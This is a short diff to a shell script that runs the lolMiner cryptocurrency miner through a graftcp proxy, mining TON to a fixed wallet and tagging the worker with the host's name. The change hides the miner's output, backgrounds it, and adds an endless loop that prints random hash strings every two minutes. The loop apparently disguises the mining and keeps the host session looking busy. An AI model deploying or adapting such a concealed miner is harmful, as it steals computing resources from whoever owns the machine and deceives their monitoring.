@@ -35,4 +35,5 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname)
+./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname) >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
